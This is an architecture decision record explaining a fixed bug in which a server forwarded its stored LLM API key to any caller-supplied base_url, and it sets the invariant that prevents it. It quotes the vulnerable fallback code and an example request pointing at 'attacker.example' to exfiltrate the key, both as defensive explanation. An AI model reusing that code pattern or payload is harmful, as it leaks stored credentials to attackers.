# ADR-027: LLM API key never leaves its configured origin

**Status:** Accepted
**Date:** 2026-04-23

## Context

`POST /v1/llm/test` and `POST /v1/llm/models` accept a partial `LLMTestRequest` / `LLMModelsRequest` body and fill in any omitted fields from `app_config.llm_backend`. Before PR #17, the fallback for `api_key` was unconditional:

```python
api_key = req.api_key if req.api_key and "..." not in req.api_key else app_config.llm_backend.api_key
```

Combined with `base_url` being accepted from the request verbatim, this was a classic confused-deputy bug. An authenticated caller posting `{"base_url": "https://attacker.example/v1"}` with no `api_key` induced the server to forward its stored `sk-...` key to an attacker-controlled endpoint. The stored credential is scoped to the *configured* backend; letting it accompany a request to a *different* backend violates least-privilege.

PR #17 fixed the concrete bug by introducing `api_v1._resolve_llm_api_key(...)`. This ADR captures the invariant so a future refactor cannot silently reintroduce it.

## Decision

**The server-stored LLM API key is never sent to any origin other than the configured one.**

Concretely, `_resolve_llm_api_key(req_api_key, req_base_url, configured_api_key, configured_base_url)` returns:

1. `req_api_key` if the request supplies a non-masked key. The caller owns that key; we forward it verbatim. Masked keys (containing `"..."`) are the to_dict() display format and are rejected.
2. `""` if the request supplies a `base_url` that is different (string-compared after `rstrip("/")`) from `configured_base_url`. This is the safe default — a different base_url means a potentially different trust boundary, so do not lend the stored key.
3. `configured_api_key` otherwise — either there is no `base_url` override, or it matches the configured one. This preserves the legitimate "test the saved config" flow.

String comparison is intentional. It is conservative: any normalisation mismatch (case, trailing slash, port presence) errs toward blanking the key, which is always safe. Semantic URL comparison would widen the "allow forwarding" path without evidence of need.

### What this is NOT

- **Not SSRF defense.** `_validate_base_url()` in `llm_factory.py` blocks metadata endpoints and private IPs (G-HTTP-LLM-TEST-004, 006); that stays where it is.
- **Not a replacement for auth.** The affected endpoints still require `BULWARK_API_TOKEN` when auth is enabled.
- **Not a scheme / port check.** We do not attempt to verify the request URL is "semantically equivalent" to configured. A port change counts as different, a trailing slash does not — those are the only normalisation concessions.

## Consequences

### Positive
- The stored key can only ever reach the backend the operator explicitly configured.
- Every call site goes through one named helper, so code review sees the safety gate instead of a ternary.
- `G-HTTP-LLM-TEST-007` pins the invariant; `test_every_guarantee_has_test` enforces test coverage.

### Negative
- A caller that wants to test "the same endpoint with a newly-generated URL format" (trailing slash added, port appended) must supply their own key. This is a minor UX tax for a meaningful security posture.

### Neutral
- `/v1/llm/models` inherits the same behaviour via the same helper. There is no asymmetry between test and models flows.
- Existing explicit-key flows (the dashboard's "Test connection" button when the user types a new key) are unaffected; they pass `api_key` in the request body and get `has_explicit_key = True`.
